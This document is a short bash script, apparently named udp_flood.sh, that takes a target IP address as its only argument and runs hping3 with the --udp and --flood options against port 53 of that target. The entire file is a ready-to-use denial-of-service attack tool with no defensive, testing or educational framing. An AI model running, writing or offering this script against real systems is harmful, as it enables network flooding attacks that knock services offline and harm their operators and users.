#!/bin/bash

TARGET_IP=$1

if [ -z "$TARGET_IP" ]; then
  echo "Usage: ./udp_flood.sh <target_ip>"
  exit 1
fi

echo "Starting UDP flood on $TARGET_IP"
sudo hping3 --udp --flood -p 53 $TARGET_IP
